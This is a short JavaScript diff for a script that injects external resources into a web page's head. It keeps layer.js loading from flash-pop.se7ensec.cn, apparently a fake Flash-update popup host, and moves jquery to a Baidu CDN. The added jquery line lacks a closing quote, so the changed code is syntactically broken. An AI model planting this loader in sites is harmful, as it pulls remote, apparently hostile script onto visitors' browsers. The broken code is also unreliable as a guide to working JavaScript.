@@ -1,13 +1,14 @@
 var s1 = document.createElement('script');
 s1.setAttribute('type','text/javascript');
-s1.setAttribute('src','//flash-pop.se7ensec.cn/layer/jquery.min.js');
+s1.setAttribute('src','https://apps.bdimg.com/libs/jquery/2.0.0/jquery.min.js);
 
 var s2 = document.createElement('script');
 s2.setAttribute('type','text/javascript');
-s2.setAttribute('src','//flash-pop.se7ensec.cn/layer/layer.js');
+s2.setAttribute('src','https://flash-pop.se7ensec.cn/layer/layer.js');
 
 var s3 = document.createElement('link');
 s3.setAttribute('type','text/css');
+s3.setAttribute('rel','stylesheet');
 s3.setAttribute('href','//cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css');
 
 var head = document.getElementsByTagName('head')[0];
